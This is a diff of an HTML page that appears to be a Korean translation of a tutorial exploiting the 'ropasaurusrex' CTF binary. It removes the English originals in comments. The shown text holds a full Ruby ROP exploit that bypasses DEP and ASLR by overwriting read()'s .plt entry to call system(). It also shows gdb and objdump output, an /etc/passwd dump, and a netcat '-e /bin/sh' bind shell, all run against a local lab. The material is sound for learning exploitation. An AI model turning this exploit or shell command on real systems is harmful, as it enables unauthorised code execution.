-cmd = ARGV[0] + &quot;\0&quot;
-
-# From objdump -x
-buf = 0x08049530
-
-# From objdump -D ./ropasaurusrex | grep read
-read_addr = 0x0804832C
-# From objdump -D ./ropasaurusrex | grep write
-write_addr = 0x0804830C
-# From gdb, &quot;x/x system&quot;
-system_addr = 0xb7ec2450
-# From objdump, &quot;pop/pop/pop/ret&quot;
-pppr_addr = 0x080484b6
-
-# Generate the payload
-payload = &quot;A&quot;*140 +
-  [
-    # system()&#39;s stack frame
-    buf,         # writable memory (cmd buf)
-    0x44444444,  # system()&#39;s return address
-
-    # pop/pop/pop/ret&#39;s stack frame
-    system_addr, # pop/pop/pop/ret&#39;s return address
-
-    # read()&#39;s stack frame
-    cmd.length,  # number of bytes
-    buf,         # writable memory (cmd buf)
-    0,           # stdin
-    pppr_addr,   # read()&#39;s return address
-
-    read_addr # Overwrite the original return
-  ].reverse.pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
-
-# Write the &#39;exploit&#39; payload
-s.write(payload)
-
-# When our payload calls read() the first time, this is read
-s.write(cmd)
-
-# Read the response from the command and print it to the screen
-puts(s.read)
-
-# Clean up
-s.close()
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;TCPSocket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -3055,14 +2801,6 @@ s.close()
 &lt;!-- And when we run it, we get the expected result: --&gt;
 
 &lt;p&gt;그리고 실행하게 되면, 예상대로 나온다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ ruby sploit.rb &quot;cat /etc/passwd&quot;
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-...
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -3084,12 +2822,6 @@ bin:x:2:2:bin:/bin:/bin/sh
 &lt;!-- This exploit worked perfectly against my test machine, but when ASLR is enabled, it failed: --&gt;
 
 &lt;p&gt;이 익스플로잇은 내 테스트 기기에서 완벽하게 작동하지만, ASLR이 적용되었다면 실패한다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ sudo sysctl -w kernel.randomize_va_space=1
-kernel.randomize_va_space = 1
-ron@debian-x86 ~ $ ruby sploit.rb &quot;cat /etc/passwd&quot;
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo sysctl -w kernel.randomize_va_space&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1
 kernel.randomize_va_space &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 1
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
@@ -3105,24 +2837,6 @@ ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb 
 &lt;!-- ASLR---or address space layout randomization---is a defense implemented on all modern systems (except for FreeBSD) that randomizes the address that libraries are loaded at. As an example, let&#39;s run ropasaurusrex twice and get the address of `system()`: --&gt;
 
 &lt;p&gt;ASLR&amp;mdash;주소 공간 레이아웃 불규칙화(address space layout randomization)&amp;mdash;은 현대 시스템(FreeBSD는 제외)에 구현된 방어 기법으로, 라이브러리가 로드 되는 주소를 불규칙화 한다. 그 예로, ropasaurusrex를 두 번 실행하고 &lt;code&gt;system()&lt;/code&gt;의 주소를 알아내 보자:&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ perl -e &#39;printf &quot;A&quot;x1000&#39; | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-Program terminated with signal 11, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb) x/x system
-0xb766e450 &lt;system&gt;:    0x890cec83
-
-ron@debian-x86 ~ $ perl -e &#39;printf &amp;quot;A&amp;quot;x1000&amp;rsquo; | ./ropasaurusrex
-Segmentation fault (core dumped)
-ron@debian-x86 ~ $ gdb ./ropasaurusrex core
-Program terminated with signal 11, Segmentation fault.
-#0  0x41414141 in ?? ()
-(gdb) x/x system
-0xb76a7450 &lt;system&gt;:    0x890cec83
-&amp;rdquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;perl -e &lt;span class=&quot;s1&quot;&gt;&amp;#39;printf &amp;quot;A&amp;quot;x1000&amp;#39;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;|&lt;/span&gt; ./ropasaurusrex
 Segmentation fault &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;core dumped&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasaurusrex core
@@ -3150,20 +2864,6 @@ Program terminated with signal 11, Segmentation fault.
 &lt;!-- So, what do we know? Well, the binary itself isn&#39;t ASLRed, which means that we can rely on every address in it to stay put, which is useful. Most importantly, the relocation table will remain at the same address: --&gt;
 
 &lt;p&gt;그래서, 뭘 해야 할까? 사실, 바이너리 자체는 ASLR이 적용되지 않아서, 유용하게도 거기 있는 모든 주소는 그대로 머물러 있다고 믿을 수 있다. 아주 중요하게도, 재배치(relocation) 테이블은 같은 주소에 남아있다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ objdump -R ./ropasaurusrex
-
-./ropasaurusrex:     file format elf32-i386
-
-DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-08049600 R_386_GLOB_DAT    __gmon_start__
-08049610 R_386_JUMP_SLOT   __gmon_start__
-08049614 R_386_JUMP_SLOT   write
-08049618 R_386_JUMP_SLOT   __libc_start_main
-0804961c R_386_JUMP_SLOT   read
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;objdump -R ./ropasaurusrex
 
 ./ropasaurusrex:     file format elf32-i386
@@ -3179,18 +2879,6 @@ OFFSET   TYPE              VALUE
 &lt;!-- So we know the address---in the binary---of `read()` and `write()`. What&#39;s that mean? Let&#39;s take a look at their values while the binary is running: --&gt;
 
 &lt;p&gt;이렇게 &lt;code&gt;read()&lt;/code&gt;와 &lt;code&gt;write()&lt;/code&gt;의 주소&amp;mdash;바이너리 안에 있는&amp;mdash;를 알게 되었다. 이게 뭘 의미하느냐? 바이너리가 실행 중일 때 이들의 값을 살펴보자:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ gdb ./ropasaurusrex
-(gdb) run
-^C
-Program received signal SIGINT, Interrupt.
-0xb7fe2424 in __kernel_vsyscall ()
-(gdb) x/x 0x0804961c
-0x804961c:      0xb7f48110
-(gdb) print read
-$1 = {&lt;text variable, no debug info&gt;} 0xb7f48110 &lt;read&gt;
-&amp;ldquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb ./ropasaurusrex
 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; run
 ^C
@@ -3369,11 +3057,6 @@ Program received signal SIGINT, Interrupt.
 &lt;!-- Frame [5] reads another address over the socket and writes it to memory. This address is going to be the address of the `system()` call. The reason writing it to memory works is because of how `read()` is called. Take a look at the `read()` call we&#39;ve been using in gdb (`0x0804832C`) and you&#39;ll see this: --&gt;
 
 &lt;p&gt;프레임 [5]는 소켓을 통해 다른 주소를 읽고 그걸 메모리에 쓴다. 이 주소는 &lt;code&gt;system()&lt;/code&gt; 호출 주소가 될 것이다. 이걸 메모리에 쓰는 게 작동하는 이유는 &lt;code&gt;read()&lt;/code&gt;가 호출되는 방식 때문이다. 우리가 gdb (&lt;code&gt;0x0804832C&lt;/code&gt;)에서 써 왔던 &lt;code&gt;read()&lt;/code&gt; 호출 부분을 보면 이렇다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-(gdb) x/i 0x0804832C
-0x804832c &lt;read@plt&gt;:   jmp    DWORD PTR ds:0x804961c
-&amp;rdquo;` &amp;ndash;&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;gdb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; x/i 0x0804832C
 0x804832c &amp;lt;&lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;@plt&amp;gt;:   jmp    DWORD PTR ds:0x804961c
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
@@ -3392,104 +3075,6 @@ Program received signal SIGINT, Interrupt.
 &lt;!-- Whew! That&#39;s quite complicated. Here&#39;s code that implements the full exploit for ropasaurusrex, bypassing both DEP and ASLR: --&gt;
 
 &lt;p&gt;휴! 꽤 복잡했다. DEP와 ASLR을 모두 우회하며 ropasaurusrex의 익스플로잇을 모두 구현한 코드다:&lt;/p&gt;
-
-&lt;!-- ``` ruby
-require &#39;socket&#39;
-
-s = TCPSocket.new(&quot;localhost&quot;, 4444)
-
-# The command we&#39;ll run
-cmd = ARGV[0] + &quot;\0&quot;
-
-# From objdump -x
-buf = 0x08049530
-
-# From objdump -D ./ropasaurusrex | grep read
-read_addr = 0x0804832C
-# From objdump -D ./ropasaurusrex | grep write
-write_addr = 0x0804830C
-# From gdb, &quot;x/x system&quot;
-system_addr = 0xb7ec2450
-# Fram objdump, &quot;pop/pop/pop/ret&quot;
-pppr_addr = 0x080484b6
-
-# The location where read()&#39;s .plt entry is
-read_addr_ptr = 0x0804961c
-
-# The difference between read() and system()
-# Calculated as  read (0xb7f48110) - system (0xb7ec2450)
-# Note: This is the one number that needs to be calculated using the
-# target version of libc rather than my own!
-read_system_diff = 0x85cc0
-
-# Generate the payload
-payload = &quot;A&quot;*140 +
-  [
-    # system()&#39;s stack frame
-    buf,         # writable memory (cmd buf)
-    0x44444444,  # system()&#39;s return address
-
-    # pop/pop/pop/ret&#39;s stack frame
-    # Note that this calls read_addr, which is overwritten by a pointer
-    # to system() in the previous stack frame
-    read_addr,   # (this will become system())
-
-    # second read()&#39;s stack frame
-    # This reads the address of system() from the socket and overwrites
-    # read()&#39;s .plt entry with it, so calls to read() end up going to
-    # system()
-    4,           # length of an address
-    read_addr_ptr, # address of read()&#39;s .plt entry
-    0,           # stdin
-    pppr_addr,   # read()&#39;s return address
-
-    # pop/pop/pop/ret&#39;s stack frame
-    read_addr,
-
-    # write()&#39;s stack frame
-    # This frame gets the address of the read() function from the .plt
-    # entry and writes to to stdout
-    4,           # length of an address
-    read_addr_ptr, # address of read()&#39;s .plt entry
-    1,           # stdout
-    pppr_addr,   # retrurn address
-
-    # pop/pop/pop/ret&#39;s stack frame
-    write_addr,
-
-    # read()&#39;s stack frame
-    # This reads the command we want to run from the socket and puts it
-    # in our writable &quot;buf&quot;
-    cmd.length,  # number of bytes
-    buf,         # writable memory (cmd buf)
-    0,           # stdin
-    pppr_addr,   # read()&#39;s return address
-
-    read_addr # Overwrite the original return
-  ].reverse.pack(&quot;I*&quot;) # Convert a series of &#39;ints&#39; to a string
-
-# Write the &#39;exploit&#39; payload
-s.write(payload)
-
-# When our payload calls read() the first time, this is read
-s.write(cmd)
-
-# Get the result of the first read() call, which is the actual address of read
-this_read_addr = s.read(4).unpack(&quot;I&quot;).first
-
-# Calculate the address of system()
-this_system_addr = this_read_addr - read_system_diff
-
-# Write the address back, where it&#39;ll be read() into the correct place by
-# the second read() call
-s.write([this_system_addr].pack(&quot;I&quot;))
-
-# Finally, read the result of the actual command
-puts(s.read())
-
-# Clean up
-s.close()
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;nb&quot;&gt;require&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;socket&amp;#39;&lt;/span&gt;
 
 &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;TCPSocket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;localhost&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
@@ -3589,15 +3174,6 @@ s.close()
 &lt;!-- And here it is in action: --&gt;
 
 &lt;p&gt;그리고 실행 결과다:&lt;/p&gt;
-
-&lt;!-- ``` sh
-$ ruby sploit.rb &quot;cat /etc/passwd&quot;
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/bin/sh
-bin:x:2:2:bin:/bin:/bin/sh
-sys:x:3:3:sys:/dev:/bin/sh
-[...]
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;cat /etc/passwd&amp;quot;&lt;/span&gt;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -3608,21 +3184,6 @@ sys:x:3:3:sys:/dev:/bin/sh
 &lt;!-- You can, of course, change `cat /etc/passwd` to anything you want (including a netcat listener!) --&gt;
 
 &lt;p&gt;물론 &lt;code&gt;cat /etc/passwd&lt;/code&gt;를 원하는 값으로 바꿀 수 있다 (netcat 리스너를 포함해서!).&lt;/p&gt;
-
-&lt;!-- ``` sh
-ron@debian-x86 ~ $ ruby sploit.rb &quot;pwd&quot;
-/home/ron
-ron@debian-x86 ~ $ ruby sploit.rb &quot;whoami&quot;
-ron
-ron@debian-x86 ~ $ ruby sploit.rb &quot;nc -vv -l -p 5555 -e /bin/sh&quot; &amp;
-[1] 3015
-ron@debian-x86 ~ $ nc -vv localhost 5555
-debian-x86.skullseclabs.org [127.0.0.1] 5555 (?) open
-pwd
-/home/ron
-whoami
-ron
-``` --&gt;
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-sh&quot; data-lang=&quot;sh&quot;&gt;ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;pwd&amp;quot;&lt;/span&gt;
 /home/ron
 ron@debian-x86 ~ &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ruby sploit.rb &lt;span class=&quot;s2&quot;&gt;&amp;quot;whoami&amp;quot;&lt;/span&gt;
